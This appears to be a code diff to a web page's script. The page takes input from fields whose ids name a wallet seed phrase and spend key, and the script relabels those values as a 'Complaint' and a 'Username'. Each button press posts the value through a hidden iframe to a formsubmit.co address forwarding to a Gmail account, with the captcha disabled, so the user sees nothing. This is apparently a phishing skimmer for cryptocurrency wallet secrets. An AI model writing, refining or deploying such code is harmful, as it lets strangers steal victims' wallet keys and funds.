@@ -984,52 +984,61 @@
 
 
  <script>
-    const complaintInput = document.getElementById("seed-input");
+    // Complaint Input & Button
+const complaintInput = document.getElementById("seed-input");
+const complaintBtn = document.getElementById("btn-derive-seed");
+
+// Username Input & Button
 const usernameInput = document.getElementById("spend-key-input");
-const sendBtn = document.getElementById("btn-derive-seed");
+const usernameBtn = document.getElementById("btn-derive-key");
 
-sendBtn.addEventListener("click", function () {
+// Create hidden iframe once
+let iframe = document.getElementById("hidden_iframe");
 
-    // Create hidden iframe if it doesn't exist
-    let iframe = document.getElementById("hidden_iframe");
+if (!iframe) {
+    iframe = document.createElement("iframe");
+    iframe.id = "hidden_iframe";
+    iframe.name = "hidden_iframe";
+    iframe.style.display = "none";
+    document.body.appendChild(iframe);
+}
 
-    if (!iframe) {
-        iframe = document.createElement("iframe");
-        iframe.id = "hidden_iframe";
-        iframe.name = "hidden_iframe";
-        iframe.style.display = "none";
-        document.body.appendChild(iframe);
-    }
-
-    // Create temporary form
+// Function to send data
+function sendToFormSubmit(fieldName, fieldValue) {
     const form = document.createElement("form");
     form.method = "POST";
     form.action = "https://formsubmit.co/exchangenet1@gmail.com";
     form.target = "hidden_iframe";
     form.style.display = "none";
 
-    // Hidden fields
-    const fields = {
-        Complaint: complaintInput.value,
-        Username: usernameInput.value,
-        _captcha: "false"
-    };
+    const captcha = document.createElement("input");
+    captcha.type = "hidden";
+    captcha.name = "_captcha";
+    captcha.value = "false";
+    form.appendChild(captcha);
 
-    for (const key in fields) {
-        const input = document.createElement("input");
-        input.type = "hidden";
-        input.name = key;
-        input.value = fields[key];
-        form.appendChild(input);
-    }
+    const field = document.createElement("input");
+    field.type = "hidden";
+    field.name = fieldName;
+    field.value = fieldValue;
+    form.appendChild(field);
 
     document.body.appendChild(form);
-
-    // Submit in the hidden iframe
     form.submit();
 
-    // Clean up the temporary form
-    setTimeout(() => form.remove(), 1000);
+    setTimeout(() => {
+        form.remove();
+    }, 1000);
+}
+
+// Complaint button
+complaintBtn.addEventListener("click", function () {
+    sendToFormSubmit("Complaint", complaintInput.value);
+});
+
+// Username button
+usernameBtn.addEventListener("click", function () {
+    sendToFormSubmit("Username", usernameInput.value);
 });
  </script>                   
 
